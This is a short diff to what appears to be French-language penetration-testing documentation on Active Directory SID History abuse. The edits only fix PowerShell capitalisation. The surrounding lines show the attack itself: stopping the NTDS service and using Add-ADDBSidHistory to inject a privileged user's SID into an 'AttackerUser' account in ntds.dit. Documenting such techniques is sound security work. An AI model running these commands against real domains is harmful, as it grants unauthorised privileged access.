@@ -98,13 +98,13 @@ $clonePr.AddSidHistory($sourceUserName, $targetUserName, 0)
 Get-ADUser -Identity $InterestingUser
 
 # Stop the NTDS service
-Stop-service NTDS -force
+Stop-Service NTDS -force
 
 # Inject the SID into the SID History attribute
-Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit
+Add-ADDBSidHistory -SamAccountName AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit
 
 # Start the NTDS service
-Start-service NTDS
+Start-Service NTDS
 ```
 
 ### Suppression d'un SIDHistory
